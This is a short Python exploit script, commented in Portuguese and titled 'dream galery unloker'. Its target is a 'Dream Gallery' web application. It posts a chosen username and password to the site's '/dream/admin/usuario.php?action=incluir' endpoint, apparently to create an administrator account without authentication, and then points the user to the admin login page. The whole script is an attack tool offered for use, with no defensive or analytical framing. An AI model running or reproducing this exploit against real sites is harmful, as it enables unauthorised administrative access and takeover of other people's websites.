import sys
import requests, urllib.request

print("dream galery unloker")
print(" .--.")
print("|.-. '----------.")
print("|-'  --^--^--p-p")
print("`---´")

urlAlvo = "null" #url do site vulneravel,ex: http://www.site.com.br
userAdd = "" #usuario padrao
passAdd = "" #senha padrao
readyToAttack = "null"

def Main():
	if len(sys.argv) <= 3:
		print("falta parametros")
	else:
		urlAlvo = sys.argv[1]
		userAdd = sys.argv[2]
		passAdd = sys.argv[3]
		readyToAttack = makeUrl(urlAlvo)
		MakePost(readyToAttack, userAdd,passAdd,urlAlvo)

def makeUrl(urlAlvo):
	urlPronta = urlAlvo + "/dream/admin/usuario.php?action=incluir"
	return urlPronta

def MakePost(urlATAK,newUser,newPass,alvo):
	
	url = urlATAK
	values = {'user_login': newUser, 
            'user_password': newPass,
            'user_email': ""
            #,'submit':"Add-Admin"
            }
 
	r = requests.post(url, values)
	print("realy niice")
	print("go to")
	print(alvo + "/dream/admin/login.php\n")
	print("to login with the new user!")

Main()